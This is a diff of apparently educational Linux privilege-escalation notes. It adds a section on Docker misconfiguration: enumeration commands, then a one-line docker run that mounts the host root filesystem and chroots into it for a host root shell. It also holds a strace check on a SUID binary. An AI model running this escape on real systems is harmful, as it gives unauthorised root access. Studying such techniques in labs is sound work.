@@ -26,12 +26,20 @@ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
 
 # Docker image misconfiguration
 
+Step 1 - Enumerate 
+
 Check the two classic Docker misconfigurations the module covers:
 
 id                    # are you in the "docker" group? <br>
 ls -la /var/run/docker.sock   # is the socket writable by you? <br>
 docker image ls       # what images are available?
 
+Step 2 — Exploit (the module's exact technique)
 
+If you're in the docker group (or socket is writable), mount the host's root filesystem into a container and chroot into it:<br>
+
+# docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash  <br>
+
+This drops you into a root shell on the HOST system (not just the container).
 
 
